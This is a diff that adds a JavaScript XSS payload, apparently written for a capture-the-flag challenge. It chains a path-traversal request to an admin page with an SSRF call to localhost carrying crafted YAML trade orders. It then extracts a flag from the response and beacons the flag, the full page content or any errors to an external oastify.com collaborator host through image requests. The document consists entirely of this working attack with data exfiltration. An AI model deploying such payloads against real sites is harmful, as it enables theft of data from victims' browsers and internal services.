@@ -1,0 +1,27 @@
+<script>
+  (async () => {
+  try {
+    const yaml =
+      "- {amount: 1000001, currency: ZZ, op: BUY}\n" +
+      "- {amount: 1000001, currency: ZZ, op: SELL}\n" +
+      "- {amount: 1, currency: FL, op: BUY}\n";
+
+    const u = "/index.php/../admin.php?url="
+      + encodeURIComponent("http://localhost:5000/index.php?html="
+      + encodeURIComponent(yaml));
+
+    const t = await (await fetch(u)).text();
+    const m = t.match(/Final\s+Inventory\s+FL\s*:\s*([A-Za-z0-9_\-:{}\[\].=]+)/);
+    const qs = m ? ("flag=" + encodeURIComponent(m[1])) : ("d=" + encodeURIComponent(t));
+
+    const i = new Image();
+    i.src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?" + qs;
+    window.__x = i; // GC対策
+  } catch (e) {
+    const j = new Image();
+    j.src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?err=" + encodeURIComponent(String(e));
+    window.__e = j;
+  }
+})();
+
+</script>
